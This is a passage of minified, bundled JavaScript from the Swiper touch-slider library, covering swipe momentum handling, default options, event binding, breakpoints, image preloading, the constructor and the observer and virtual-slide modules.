          }), !i.isTouched || !i.isMoved || !t.swipeDirection || 0 === a.diff || i.currentTranslate === i.startTranslate) return i.isTouched = !1, i.isMoved = !1, void (i.startMoving = !1);
          if (i.isTouched = !1, i.isMoved = !1, i.startMoving = !1, p = s.followFinger ? r ? t.translate : -t.translate : -i.currentTranslate, !s.cssMode) if (s.freeMode) {
            if (p < -t.minTranslate()) return void t.slideTo(t.activeIndex);
            if (p > -t.maxTranslate()) return void (t.slides.length < d.length ? t.slideTo(d.length - 1) : t.slideTo(t.slides.length - 1));
            if (s.freeModeMomentum) {
              if (i.velocities.length > 1) {
                var v = i.velocities.pop(),
                  f = i.velocities.pop(),
                  m = v.position - f.position,
                  g = v.time - f.time;
                t.velocity = m / g, t.velocity /= 2, Math.abs(t.velocity) < s.freeModeMinimumVelocity && (t.velocity = 0), (g > 150 || n.now() - v.time > 300) && (t.velocity = 0);
              } else t.velocity = 0;
              t.velocity *= s.freeModeMomentumVelocityRatio, i.velocities.length = 0;
              var b = 1e3 * s.freeModeMomentumRatio,
                w = t.velocity * b,
                y = t.translate + w;
              r && (y = -y);
              var x,
                T,
                E = !1,
                S = 20 * Math.abs(t.velocity) * s.freeModeMomentumBounceRatio;
              if (y < t.maxTranslate()) s.freeModeMomentumBounce ? (y + t.maxTranslate() < -S && (y = t.maxTranslate() - S), x = t.maxTranslate(), E = !0, i.allowMomentumBounce = !0) : y = t.maxTranslate(), s.loop && s.centeredSlides && (T = !0);else if (y > t.minTranslate()) s.freeModeMomentumBounce ? (y - t.minTranslate() > S && (y = t.minTranslate() + S), x = t.minTranslate(), E = !0, i.allowMomentumBounce = !0) : y = t.minTranslate(), s.loop && s.centeredSlides && (T = !0);else if (s.freeModeSticky) {
                for (var C, M = 0; M < d.length; M += 1) if (d[M] > -y) {
                  C = M;
                  break;
                }
                y = -(y = Math.abs(d[C] - y) < Math.abs(d[C - 1] - y) || "next" === t.swipeDirection ? d[C] : d[C - 1]);
              }
              if (T && t.once("transitionEnd", function () {
                t.loopFix();
              }), 0 !== t.velocity) {
                if (b = r ? Math.abs((-y - t.translate) / t.velocity) : Math.abs((y - t.translate) / t.velocity), s.freeModeSticky) {
                  var P = Math.abs((r ? -y : y) - t.translate),
                    z = t.slidesSizesGrid[t.activeIndex];
                  b = P < z ? s.speed : P < 2 * z ? 1.5 * s.speed : 2.5 * s.speed;
                }
              } else if (s.freeModeSticky) return void t.slideToClosest();
              s.freeModeMomentumBounce && E ? (t.updateProgress(x), t.setTransition(b), t.setTranslate(y), t.transitionStart(!0, t.swipeDirection), t.animating = !0, o.transitionEnd(function () {
                t && !t.destroyed && i.allowMomentumBounce && (t.emit("momentumBounce"), t.setTransition(s.speed), t.setTranslate(x), o.transitionEnd(function () {
                  t && !t.destroyed && t.transitionEnd();
                }));
              })) : t.velocity ? (t.updateProgress(y), t.setTransition(b), t.setTranslate(y), t.transitionStart(!0, t.swipeDirection), t.animating || (t.animating = !0, o.transitionEnd(function () {
                t && !t.destroyed && t.transitionEnd();
              }))) : t.updateProgress(y), t.updateActiveIndex(), t.updateSlidesClasses();
            } else if (s.freeModeSticky) return void t.slideToClosest();
            (!s.freeModeMomentum || u >= s.longSwipesMs) && (t.updateProgress(), t.updateActiveIndex(), t.updateSlidesClasses());
          } else {
            for (var k = 0, $ = t.slidesSizesGrid[0], L = 0; L < l.length; L += L < s.slidesPerGroupSkip ? 1 : s.slidesPerGroup) {
              var I = L < s.slidesPerGroupSkip - 1 ? 1 : s.slidesPerGroup;
              void 0 !== l[L + I] ? p >= l[L] && p < l[L + I] && (k = L, $ = l[L + I] - l[L]) : p >= l[L] && (k = L, $ = l[l.length - 1] - l[l.length - 2]);
            }
            var D = (p - l[k]) / $,
              O = k < s.slidesPerGroupSkip - 1 ? 1 : s.slidesPerGroup;
            if (u > s.longSwipesMs) {
              if (!s.longSwipes) return void t.slideTo(t.activeIndex);
              "next" === t.swipeDirection && (D >= s.longSwipesRatio ? t.slideTo(k + O) : t.slideTo(k)), "prev" === t.swipeDirection && (D > 1 - s.longSwipesRatio ? t.slideTo(k + O) : t.slideTo(k));
            } else {
              if (!s.shortSwipes) return void t.slideTo(t.activeIndex);
              t.navigation && (h.target === t.navigation.nextEl || h.target === t.navigation.prevEl) ? h.target === t.navigation.nextEl ? t.slideTo(k + O) : t.slideTo(k) : ("next" === t.swipeDirection && t.slideTo(k + O), "prev" === t.swipeDirection && t.slideTo(k));
            }
          }
        }
        function G() {
          var e = this.params,
            t = this.el;
          if (!t || 0 !== t.offsetWidth) {
            e.breakpoints && this.setBreakpoint();
            var i = this.allowSlideNext,
              s = this.allowSlidePrev,
              a = this.snapGrid;
            this.allowSlideNext = !0, this.allowSlidePrev = !0, this.updateSize(), this.updateSlides(), this.updateSlidesClasses(), ("auto" === e.slidesPerView || e.slidesPerView > 1) && this.isEnd && !this.params.centeredSlides ? this.slideTo(this.slides.length - 1, 0, !1, !0) : this.slideTo(this.activeIndex, 0, !1, !0), this.autoplay && this.autoplay.running && this.autoplay.paused && this.autoplay.run(), this.allowSlidePrev = s, this.allowSlideNext = i, this.params.watchOverflow && a !== this.snapGrid && this.checkOverflow();
          }
        }
        function B(e) {
          this.allowClick || (this.params.preventClicks && e.preventDefault(), this.params.preventClicksPropagation && this.animating && (e.stopPropagation(), e.stopImmediatePropagation()));
        }
        function H() {
          var e = this.wrapperEl;
          this.previousTranslate = this.translate, this.translate = this.isHorizontal() ? -e.scrollLeft : -e.scrollTop, -0 === this.translate && (this.translate = 0), this.updateActiveIndex(), this.updateSlidesClasses();
          var t = this.maxTranslate() - this.minTranslate();
          (0 === t ? 0 : (this.translate - this.minTranslate()) / t) !== this.progress && this.updateProgress(this.translate), this.emit("setTranslate", this.translate, !1);
        }
        var N = !1;
        function X() {}
        var V = {
            init: !0,
            direction: "horizontal",
            touchEventsTarget: "container",
            initialSlide: 0,
            speed: 300,
            cssMode: !1,
            updateOnWindowResize: !0,
            preventInteractionOnTransition: !1,
            edgeSwipeDetection: !1,
            edgeSwipeThreshold: 20,
            freeMode: !1,
            freeModeMomentum: !0,
            freeModeMomentumRatio: 1,
            freeModeMomentumBounce: !0,
            freeModeMomentumBounceRatio: 1,
            freeModeMomentumVelocityRatio: 1,
            freeModeSticky: !1,
            freeModeMinimumVelocity: .02,
            autoHeight: !1,
            setWrapperSize: !1,
            virtualTranslate: !1,
            effect: "slide",
            breakpoints: void 0,
            spaceBetween: 0,
            slidesPerView: 1,
            slidesPerColumn: 1,
            slidesPerColumnFill: "column",
            slidesPerGroup: 1,
            slidesPerGroupSkip: 0,
            centeredSlides: !1,
            centeredSlidesBounds: !1,
            slidesOffsetBefore: 0,
            slidesOffsetAfter: 0,
            normalizeSlideIndex: !0,
            centerInsufficientSlides: !1,
            watchOverflow: !1,
            roundLengths: !1,
            touchRatio: 1,
            touchAngle: 45,
            simulateTouch: !0,
            shortSwipes: !0,
            longSwipes: !0,
            longSwipesRatio: .5,
            longSwipesMs: 300,
            followFinger: !0,
            allowTouchMove: !0,
            threshold: 0,
            touchMoveStopPropagation: !1,
            touchStartPreventDefault: !0,
            touchStartForcePreventDefault: !1,
            touchReleaseOnEdges: !1,
            uniqueNavElements: !0,
            resistance: !0,
            resistanceRatio: .85,
            watchSlidesProgress: !1,
            watchSlidesVisibility: !1,
            grabCursor: !1,
            preventClicks: !0,
            preventClicksPropagation: !0,
            slideToClickedSlide: !1,
            preloadImages: !0,
            updateOnImagesReady: !0,
            loop: !1,
            loopAdditionalSlides: 0,
            loopedSlides: null,
            loopFillGroupWithBlank: !1,
            allowSlidePrev: !0,
            allowSlideNext: !0,
            swipeHandler: null,
            noSwiping: !0,
            noSwipingClass: "swiper-no-swiping",
            noSwipingSelector: null,
            passiveListeners: !0,
            containerModifierClass: "swiper-container-",
            slideClass: "swiper-slide",
            slideBlankClass: "swiper-slide-invisible-blank",
            slideActiveClass: "swiper-slide-active",
            slideDuplicateActiveClass: "swiper-slide-duplicate-active",
            slideVisibleClass: "swiper-slide-visible",
            slideDuplicateClass: "swiper-slide-duplicate",
            slideNextClass: "swiper-slide-next",
            slideDuplicateNextClass: "swiper-slide-duplicate-next",
            slidePrevClass: "swiper-slide-prev",
            slideDuplicatePrevClass: "swiper-slide-duplicate-prev",
            wrapperClass: "swiper-wrapper",
            runCallbacksOnInit: !0
          },
          Y = {
            update: h,
            translate: p,
            transition: c,
            slide: u,
            loop: v,
            grabCursor: f,
            manipulation: L,
            events: {
              attachEvents: function attachEvents() {
                var t = this.params,
                  i = this.touchEvents,
                  s = this.el,
                  a = this.wrapperEl;
                this.onTouchStart = D.bind(this), this.onTouchMove = O.bind(this), this.onTouchEnd = A.bind(this), t.cssMode && (this.onScroll = H.bind(this)), this.onClick = B.bind(this);
                var r = !!t.nested;
                if (!o.touch && o.pointerEvents) s.addEventListener(i.start, this.onTouchStart, !1), e.addEventListener(i.move, this.onTouchMove, r), e.addEventListener(i.end, this.onTouchEnd, !1);else {
                  if (o.touch) {
                    var n = !("touchstart" !== i.start || !o.passiveListener || !t.passiveListeners) && {
                      passive: !0,
                      capture: !1
                    };
                    s.addEventListener(i.start, this.onTouchStart, n), s.addEventListener(i.move, this.onTouchMove, o.passiveListener ? {
                      passive: !1,
                      capture: r
                    } : r), s.addEventListener(i.end, this.onTouchEnd, n), i.cancel && s.addEventListener(i.cancel, this.onTouchEnd, n), N || (e.addEventListener("touchstart", X), N = !0);
                  }
                  (t.simulateTouch && !I.ios && !I.android || t.simulateTouch && !o.touch && I.ios) && (s.addEventListener("mousedown", this.onTouchStart, !1), e.addEventListener("mousemove", this.onTouchMove, r), e.addEventListener("mouseup", this.onTouchEnd, !1));
                }
                (t.preventClicks || t.preventClicksPropagation) && s.addEventListener("click", this.onClick, !0), t.cssMode && a.addEventListener("scroll", this.onScroll), t.updateOnWindowResize ? this.on(I.ios || I.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", G, !0) : this.on("observerUpdate", G, !0);
              },
              detachEvents: function detachEvents() {
                var t = this.params,
                  i = this.touchEvents,
                  s = this.el,
                  a = this.wrapperEl,
                  r = !!t.nested;
                if (!o.touch && o.pointerEvents) s.removeEventListener(i.start, this.onTouchStart, !1), e.removeEventListener(i.move, this.onTouchMove, r), e.removeEventListener(i.end, this.onTouchEnd, !1);else {
                  if (o.touch) {
                    var n = !("onTouchStart" !== i.start || !o.passiveListener || !t.passiveListeners) && {
                      passive: !0,
                      capture: !1
                    };
                    s.removeEventListener(i.start, this.onTouchStart, n), s.removeEventListener(i.move, this.onTouchMove, r), s.removeEventListener(i.end, this.onTouchEnd, n), i.cancel && s.removeEventListener(i.cancel, this.onTouchEnd, n);
                  }
                  (t.simulateTouch && !I.ios && !I.android || t.simulateTouch && !o.touch && I.ios) && (s.removeEventListener("mousedown", this.onTouchStart, !1), e.removeEventListener("mousemove", this.onTouchMove, r), e.removeEventListener("mouseup", this.onTouchEnd, !1));
                }
                (t.preventClicks || t.preventClicksPropagation) && s.removeEventListener("click", this.onClick, !0), t.cssMode && a.removeEventListener("scroll", this.onScroll), this.off(I.ios || I.android ? "resize orientationchange observerUpdate" : "resize observerUpdate", G);
              }
            },
            breakpoints: {
              setBreakpoint: function setBreakpoint() {
                var e = this.activeIndex,
                  t = this.initialized,
                  i = this.loopedSlides;
                void 0 === i && (i = 0);
                var s = this.params,
                  a = this.$el,
                  r = s.breakpoints;
                if (r && (!r || 0 !== Object.keys(r).length)) {
                  var o = this.getBreakpoint(r);
                  if (o && this.currentBreakpoint !== o) {
                    var l = o in r ? r[o] : void 0;
                    l && ["slidesPerView", "spaceBetween", "slidesPerGroup", "slidesPerGroupSkip", "slidesPerColumn"].forEach(function (e) {
                      var t = l[e];
                      void 0 !== t && (l[e] = "slidesPerView" !== e || "AUTO" !== t && "auto" !== t ? "slidesPerView" === e ? parseFloat(t) : parseInt(t, 10) : "auto");
                    });
                    var d = l || this.originalParams,
                      h = s.slidesPerColumn > 1,
                      p = d.slidesPerColumn > 1;
                    h && !p ? a.removeClass(s.containerModifierClass + "multirow " + s.containerModifierClass + "multirow-column") : !h && p && (a.addClass(s.containerModifierClass + "multirow"), "column" === d.slidesPerColumnFill && a.addClass(s.containerModifierClass + "multirow-column"));
                    var c = d.direction && d.direction !== s.direction,
                      u = s.loop && (d.slidesPerView !== s.slidesPerView || c);
                    c && t && this.changeDirection(), n.extend(this.params, d), n.extend(this, {
                      allowTouchMove: this.params.allowTouchMove,
                      allowSlideNext: this.params.allowSlideNext,
                      allowSlidePrev: this.params.allowSlidePrev
                    }), this.currentBreakpoint = o, u && t && (this.loopDestroy(), this.loopCreate(), this.updateSlides(), this.slideTo(e - i + this.loopedSlides, 0, !1)), this.emit("breakpoint", d);
                  }
                }
              },
              getBreakpoint: function getBreakpoint(e) {
                if (e) {
                  var i = !1,
                    s = Object.keys(e).map(function (e) {
                      if ("string" == typeof e && e.startsWith("@")) {
                        var i = parseFloat(e.substr(1));
                        return {
                          value: t.innerHeight * i,
                          point: e
                        };
                      }
                      return {
                        value: e,
                        point: e
                      };
                    });
                  s.sort(function (e, t) {
                    return parseInt(e.value, 10) - parseInt(t.value, 10);
                  });
                  for (var a = 0; a < s.length; a += 1) {
                    var r = s[a],
                      n = r.point;
                    r.value <= t.innerWidth && (i = n);
                  }
                  return i || "max";
                }
              }
            },
            checkOverflow: {
              checkOverflow: function checkOverflow() {
                var e = this.params,
                  t = this.isLocked,
                  i = this.slides.length > 0 && e.slidesOffsetBefore + e.spaceBetween * (this.slides.length - 1) + this.slides[0].offsetWidth * this.slides.length;
                e.slidesOffsetBefore && e.slidesOffsetAfter && i ? this.isLocked = i <= this.size : this.isLocked = 1 === this.snapGrid.length, this.allowSlideNext = !this.isLocked, this.allowSlidePrev = !this.isLocked, t !== this.isLocked && this.emit(this.isLocked ? "lock" : "unlock"), t && t !== this.isLocked && (this.isEnd = !1, this.navigation.update());
              }
            },
            classes: {
              addClasses: function addClasses() {
                var e = this.classNames,
                  t = this.params,
                  i = this.rtl,
                  s = this.$el,
                  a = [];
                a.push("initialized"), a.push(t.direction), t.freeMode && a.push("free-mode"), t.autoHeight && a.push("autoheight"), i && a.push("rtl"), t.slidesPerColumn > 1 && (a.push("multirow"), "column" === t.slidesPerColumnFill && a.push("multirow-column")), I.android && a.push("android"), I.ios && a.push("ios"), t.cssMode && a.push("css-mode"), a.forEach(function (i) {
                  e.push(t.containerModifierClass + i);
                }), s.addClass(e.join(" "));
              },
              removeClasses: function removeClasses() {
                var e = this.$el,
                  t = this.classNames;
                e.removeClass(t.join(" "));
              }
            },
            images: {
              loadImage: function loadImage(e, i, s, a, r, n) {
                var o;
                function l() {
                  n && n();
                }
                e.complete && r ? l() : i ? ((o = new t.Image()).onload = l, o.onerror = l, a && (o.sizes = a), s && (o.srcset = s), i && (o.src = i)) : l();
              },
              preloadImages: function preloadImages() {
                var e = this;
                function t() {
                  null != e && e && !e.destroyed && (void 0 !== e.imagesLoaded && (e.imagesLoaded += 1), e.imagesLoaded === e.imagesToLoad.length && (e.params.updateOnImagesReady && e.update(), e.emit("imagesReady")));
                }
                e.imagesToLoad = e.$el.find("img");
                for (var i = 0; i < e.imagesToLoad.length; i += 1) {
                  var s = e.imagesToLoad[i];
                  e.loadImage(s, s.currentSrc || s.getAttribute("src"), s.srcset || s.getAttribute("srcset"), s.sizes || s.getAttribute("sizes"), !0, t);
                }
              }
            }
          },
          F = {},
          W = function (e) {
            function t() {
              for (var i, a, r, l = [], d = arguments.length; d--;) l[d] = arguments[d];
              1 === l.length && l[0].constructor && l[0].constructor === Object ? r = l[0] : (a = (i = l)[0], r = i[1]), r || (r = {}), r = n.extend({}, r), a && !r.el && (r.el = a), e.call(this, r), Object.keys(Y).forEach(function (e) {
                Object.keys(Y[e]).forEach(function (i) {
                  t.prototype[i] || (t.prototype[i] = Y[e][i]);
                });
              });
              var h = this;
              void 0 === h.modules && (h.modules = {}), Object.keys(h.modules).forEach(function (e) {
                var t = h.modules[e];
                if (t.params) {
                  var i = Object.keys(t.params)[0],
                    s = t.params[i];
                  if ("object" != _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(s) || null === s) return;
                  if (!(i in r && "enabled" in s)) return;
                  !0 === r[i] && (r[i] = {
                    enabled: !0
                  }), "object" != _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(r[i]) || "enabled" in r[i] || (r[i].enabled = !0), r[i] || (r[i] = {
                    enabled: !1
                  });
                }
              });
              var p = n.extend({}, V);
              h.useModulesParams(p), h.params = n.extend({}, p, F, r), h.originalParams = n.extend({}, h.params), h.passedParams = n.extend({}, r), h.$ = s;
              var c = s(h.params.el);
              if (a = c[0]) {
                if (c.length > 1) {
                  var u = [];
                  return c.each(function (e, i) {
                    var s = n.extend({}, r, {
                      el: i
                    });
                    u.push(new t(s));
                  }), u;
                }
                var v, f, m;
                return a.swiper = h, c.data("swiper", h), a && a.shadowRoot && a.shadowRoot.querySelector ? (v = s(a.shadowRoot.querySelector("." + h.params.wrapperClass))).children = function (e) {
                  return c.children(e);
                } : v = c.children("." + h.params.wrapperClass), n.extend(h, {
                  $el: c,
                  el: a,
                  $wrapperEl: v,
                  wrapperEl: v[0],
                  classNames: [],
                  slides: s(),
                  slidesGrid: [],
                  snapGrid: [],
                  slidesSizesGrid: [],
                  isHorizontal: function isHorizontal() {
                    return "horizontal" === h.params.direction;
                  },
                  isVertical: function isVertical() {
                    return "vertical" === h.params.direction;
                  },
                  rtl: "rtl" === a.dir.toLowerCase() || "rtl" === c.css("direction"),
                  rtlTranslate: "horizontal" === h.params.direction && ("rtl" === a.dir.toLowerCase() || "rtl" === c.css("direction")),
                  wrongRTL: "-webkit-box" === v.css("display"),
                  activeIndex: 0,
                  realIndex: 0,
                  isBeginning: !0,
                  isEnd: !1,
                  translate: 0,
                  previousTranslate: 0,
                  progress: 0,
                  velocity: 0,
                  animating: !1,
                  allowSlideNext: h.params.allowSlideNext,
                  allowSlidePrev: h.params.allowSlidePrev,
                  touchEvents: (f = ["touchstart", "touchmove", "touchend", "touchcancel"], m = ["mousedown", "mousemove", "mouseup"], o.pointerEvents && (m = ["pointerdown", "pointermove", "pointerup"]), h.touchEventsTouch = {
                    start: f[0],
                    move: f[1],
                    end: f[2],
                    cancel: f[3]
                  }, h.touchEventsDesktop = {
                    start: m[0],
                    move: m[1],
                    end: m[2]
                  }, o.touch || !h.params.simulateTouch ? h.touchEventsTouch : h.touchEventsDesktop),
                  touchEventsData: {
                    isTouched: void 0,
                    isMoved: void 0,
                    allowTouchCallbacks: void 0,
                    touchStartTime: void 0,
                    isScrolling: void 0,
                    currentTranslate: void 0,
                    startTranslate: void 0,
                    allowThresholdMove: void 0,
                    formElements: "input, select, option, textarea, button, video, label",
                    lastClickTime: n.now(),
                    clickTimeout: void 0,
                    velocities: [],
                    allowMomentumBounce: void 0,
                    isTouchEvent: void 0,
                    startMoving: void 0
                  },
                  allowClick: !0,
                  allowTouchMove: h.params.allowTouchMove,
                  touches: {
                    startX: 0,
                    startY: 0,
                    currentX: 0,
                    currentY: 0,
                    diff: 0
                  },
                  imagesToLoad: [],
                  imagesLoaded: 0
                }), h.useModules(), h.params.init && h.init(), h;
              }
            }
            e && (t.__proto__ = e), t.prototype = Object.create(e && e.prototype), t.prototype.constructor = t;
            var i = {
              extendedDefaults: {
                configurable: !0
              },
              defaults: {
                configurable: !0
              },
              Class: {
                configurable: !0
              },
              $: {
                configurable: !0
              }
            };
            return t.prototype.slidesPerViewDynamic = function () {
              var e = this.params,
                t = this.slides,
                i = this.slidesGrid,
                s = this.size,
                a = this.activeIndex,
                r = 1;
              if (e.centeredSlides) {
                for (var n, o = t[a].swiperSlideSize, l = a + 1; l < t.length; l += 1) t[l] && !n && (r += 1, (o += t[l].swiperSlideSize) > s && (n = !0));
                for (var d = a - 1; d >= 0; d -= 1) t[d] && !n && (r += 1, (o += t[d].swiperSlideSize) > s && (n = !0));
              } else for (var h = a + 1; h < t.length; h += 1) i[h] - i[a] < s && (r += 1);
              return r;
            }, t.prototype.update = function () {
              var e = this;
              if (e && !e.destroyed) {
                var t = e.snapGrid,
                  i = e.params;
                i.breakpoints && e.setBreakpoint(), e.updateSize(), e.updateSlides(), e.updateProgress(), e.updateSlidesClasses(), e.params.freeMode ? (s(), e.params.autoHeight && e.updateAutoHeight()) : (("auto" === e.params.slidesPerView || e.params.slidesPerView > 1) && e.isEnd && !e.params.centeredSlides ? e.slideTo(e.slides.length - 1, 0, !1, !0) : e.slideTo(e.activeIndex, 0, !1, !0)) || s(), i.watchOverflow && t !== e.snapGrid && e.checkOverflow(), e.emit("update");
              }
              function s() {
                var t = e.rtlTranslate ? -1 * e.translate : e.translate,
                  i = Math.min(Math.max(t, e.maxTranslate()), e.minTranslate());
                e.setTranslate(i), e.updateActiveIndex(), e.updateSlidesClasses();
              }
            }, t.prototype.changeDirection = function (e, t) {
              void 0 === t && (t = !0);
              var i = this.params.direction;
              return e || (e = "horizontal" === i ? "vertical" : "horizontal"), e === i || "horizontal" !== e && "vertical" !== e ? this : (this.$el.removeClass("" + this.params.containerModifierClass + i).addClass("" + this.params.containerModifierClass + e), this.params.direction = e, this.slides.each(function (t, i) {
                "vertical" === e ? i.style.width = "" : i.style.height = "";
              }), this.emit("changeDirection"), t && this.update(), this);
            }, t.prototype.init = function () {
              this.initialized || (this.emit("beforeInit"), this.params.breakpoints && this.setBreakpoint(), this.addClasses(), this.params.loop && this.loopCreate(), this.updateSize(), this.updateSlides(), this.params.watchOverflow && this.checkOverflow(), this.params.grabCursor && this.setGrabCursor(), this.params.preloadImages && this.preloadImages(), this.params.loop ? this.slideTo(this.params.initialSlide + this.loopedSlides, 0, this.params.runCallbacksOnInit) : this.slideTo(this.params.initialSlide, 0, this.params.runCallbacksOnInit), this.attachEvents(), this.initialized = !0, this.emit("init"));
            }, t.prototype.destroy = function (e, t) {
              void 0 === e && (e = !0), void 0 === t && (t = !0);
              var i = this,
                s = i.params,
                a = i.$el,
                r = i.$wrapperEl,
                o = i.slides;
              return void 0 === i.params || i.destroyed ? null : (i.emit("beforeDestroy"), i.initialized = !1, i.detachEvents(), s.loop && i.loopDestroy(), t && (i.removeClasses(), a.removeAttr("style"), r.removeAttr("style"), o && o.length && o.removeClass([s.slideVisibleClass, s.slideActiveClass, s.slideNextClass, s.slidePrevClass].join(" ")).removeAttr("style").removeAttr("data-swiper-slide-index")), i.emit("destroy"), Object.keys(i.eventsListeners).forEach(function (e) {
                i.off(e);
              }), !1 !== e && (i.$el[0].swiper = null, i.$el.data("swiper", null), n.deleteProps(i)), i.destroyed = !0, null);
            }, t.extendDefaults = function (e) {
              n.extend(F, e);
            }, i.extendedDefaults.get = function () {
              return F;
            }, i.defaults.get = function () {
              return V;
            }, i.Class.get = function () {
              return e;
            }, i.$.get = function () {
              return s;
            }, Object.defineProperties(t, i), t;
          }(l),
          R = {
            name: "device",
            proto: {
              device: I
            },
            static: {
              device: I
            }
          },
          q = {
            name: "support",
            proto: {
              support: o
            },
            static: {
              support: o
            }
          },
          j = {
            isEdge: !!t.navigator.userAgent.match(/Edge/g),
            isSafari: function () {
              var e = t.navigator.userAgent.toLowerCase();
              return e.indexOf("safari") >= 0 && e.indexOf("chrome") < 0 && e.indexOf("android") < 0;
            }(),
            isUiWebView: /(iPhone|iPod|iPad).*AppleWebKit(?!.*Safari)/i.test(t.navigator.userAgent)
          },
          K = {
            name: "browser",
            proto: {
              browser: j
            },
            static: {
              browser: j
            }
          },
          U = {
            name: "resize",
            create: function create() {
              var e = this;
              n.extend(e, {
                resize: {
                  resizeHandler: function resizeHandler() {
                    e && !e.destroyed && e.initialized && (e.emit("beforeResize"), e.emit("resize"));
                  },
                  orientationChangeHandler: function orientationChangeHandler() {
                    e && !e.destroyed && e.initialized && e.emit("orientationchange");
                  }
                }
              });
            },
            on: {
              init: function init() {
                t.addEventListener("resize", this.resize.resizeHandler), t.addEventListener("orientationchange", this.resize.orientationChangeHandler);
              },
              destroy: function destroy() {
                t.removeEventListener("resize", this.resize.resizeHandler), t.removeEventListener("orientationchange", this.resize.orientationChangeHandler);
              }
            }
          },
          _ = {
            func: t.MutationObserver || t.WebkitMutationObserver,
            attach: function attach(e, i) {
              void 0 === i && (i = {});
              var s = this,
                a = new (0, _.func)(function (e) {
                  if (1 !== e.length) {
                    var i = function i() {
                      s.emit("observerUpdate", e[0]);
                    };
                    t.requestAnimationFrame ? t.requestAnimationFrame(i) : t.setTimeout(i, 0);
                  } else s.emit("observerUpdate", e[0]);
                });
              a.observe(e, {
                attributes: void 0 === i.attributes || i.attributes,
                childList: void 0 === i.childList || i.childList,
                characterData: void 0 === i.characterData || i.characterData
              }), s.observer.observers.push(a);
            },
            init: function init() {
              if (o.observer && this.params.observer) {
                if (this.params.observeParents) for (var e = this.$el.parents(), t = 0; t < e.length; t += 1) this.observer.attach(e[t]);
                this.observer.attach(this.$el[0], {
                  childList: this.params.observeSlideChildren
                }), this.observer.attach(this.$wrapperEl[0], {
                  attributes: !1
                });
              }
            },
            destroy: function destroy() {
              this.observer.observers.forEach(function (e) {
                e.disconnect();
              }), this.observer.observers = [];
            }
          },
          Z = {
            name: "observer",
            params: {
              observer: !1,
              observeParents: !1,
              observeSlideChildren: !1
            },
            create: function create() {
              n.extend(this, {
                observer: {
                  init: _.init.bind(this),
                  attach: _.attach.bind(this),
                  destroy: _.destroy.bind(this),
                  observers: []
                }
              });
            },
            on: {
              init: function init() {
                this.observer.init();
              },
              destroy: function destroy() {
                this.observer.destroy();
              }
            }
          },
          Q = {
            update: function update(e) {
              var t = this,
                i = t.params,
                s = i.slidesPerView,
                a = i.slidesPerGroup,
                r = i.centeredSlides,
                o = t.params.virtual,
                l = o.addSlidesBefore,
                d = o.addSlidesAfter,
                h = t.virtual,
                p = h.from,
                c = h.to,
                u = h.slides,
                v = h.slidesGrid,
                f = h.renderSlide,
                m = h.offset;
              t.updateActiveIndex();
              var g,
                b,
                w,
                y = t.activeIndex || 0;
              g = t.rtlTranslate ? "right" : t.isHorizontal() ? "left" : "top", r ? (b = Math.floor(s / 2) + a + l, w = Math.floor(s / 2) + a + d) : (b = s + (a - 1) + l, w = a + d);
              var x = Math.max((y || 0) - w, 0),
                T = Math.min((y || 0) + b, u.length - 1),
                E = (t.slidesGrid[x] || 0) - (t.slidesGrid[0] || 0);
              function S() {
                t.updateSlides(), t.updateProgress(), t.updateSlidesClasses(), t.lazy && t.params.lazy.enabled && t.lazy.load();
              }
              if (n.extend(t.virtual, {
                from: x,
                to: T,
                offset: E,
                slidesGrid: t.slidesGrid
              }), p === x && c === T && !e) return t.slidesGrid !== v && E !== m && t.slides.css(g, E + "px"), void t.updateProgress();
              if (t.params.virtual.renderExternal) return t.params.virtual.renderExternal.call(t, {
                offset: E,
                from: x,
                to: T,
                slides: function () {
                  for (var e = [], t = x; t <= T; t += 1) e.push(u[t]);
                  return e;
                }()
              }), void S();
              var C = [],
                M = [];
              if (e) t.$wrapperEl.find("." + t.params.slideClass).remove();else for (var P = p; P <= c; P += 1) (P < x || P > T) && t.$wrapperEl.find("." + t.params.slideClass + '[data-swiper-slide-index="' + P + '"]').remove();
              for (var z = 0; z < u.length; z += 1) z >= x && z <= T && (void 0 === c || e ? M.push(z) : (z > c && M.push(z), z < p && C.push(z)));
              M.forEach(function (e) {
                t.$wrapperEl.append(f(u[e], e));
              }), C.sort(function (e, t) {
                return t - e;
              }).forEach(function (e) {
                t.$wrapperEl.prepend(f(u[e], e));
              }), t.$wrapperEl.children(".swiper-slide").css(g, E + "px"), S();
            },
            renderSlide: function renderSlide(e, t) {
              var i = this.params.virtual;
              if (i.cache && this.virtual.cache[t]) return this.virtual.cache[t];
              var a = i.renderSlide ? s(i.renderSlide.call(this, e, t)) : s('<div class="' + this.params.slideClass + '" data-swiper-slide-index="' + t + '">' + e + "</div>");
              return a.attr("data-swiper-slide-index") || a.attr("data-swiper-slide-index", t), i.cache && (this.virtual.cache[t] = a), a;
            },
            appendSlide: function appendSlide(e) {
              if ("object" == _babel_runtime_helpers_typeof__WEBPACK_IMPORTED_MODULE_0___default()(e) && "length" in e) for (var t = 0; t < e.length; t += 1) e[t] && this.virtual.slides.push(e[t]);else this.virtual.slides.push(e);
              this.virtual.update(!0);
            },
            prependSlide: function prependSlide(e) {
              var t = this.activeIndex,
                i = t + 1,
                s = 1;
              if (Array.isArray(e)) {
                for (var a = 0; a < e.length; a += 1) e[a] && this.virtual.slides.unshift(e[a]);
                i = t + e.length, s = e.length;
              } else this.virtual.slides.unshift(e);
              if (this.params.virtual.cache) {
                var r = this.virtual.cache,
                  n = {};
                Object.keys(r).forEach(function (e) {
                  var t = r[e],
                    i = t.attr("data-swiper-slide-index");
                  i && t.attr("data-swiper-slide-index", parseInt(i, 10) + 1), n[parseInt(e, 10) + s] = t;
                }), this.virtual.cache = n;
              }
              this.virtual.update(!0), this.slideTo(i, 0);
            },
            removeSlide: function removeSlide(e) {
              if (null != e) {
                var t = this.activeIndex;
                if (Array.isArray(e)) for (var i = e.length - 1; i >= 0; i -= 1) this.virtual.slides.splice(e[i], 1), this.params.virtual.cache && delete this.virtual.cache[e[i]], e[i] < t && (t -= 1), t = Math.max(t, 0);else this.virtual.slides.splice(e, 1), this.params.virtual.cache && delete this.virtual.cache[e], e < t && (t -= 1), t = Math.max(t, 0);
                this.virtual.update(!0), this.slideTo(t, 0);
              }
            },
            removeAllSlides: function removeAllSlides() {
              this.virtual.slides = [], this.params.virtual.cache && (this.virtual.cache = {}), this.virtual.update(!0), this.slideTo(0, 0);
            }
          },
          J = {
            name: "virtual",
            params: {
              virtual: {
                enabled: !1,
                slides: [],
                cache: !0,
                renderSlide: null,
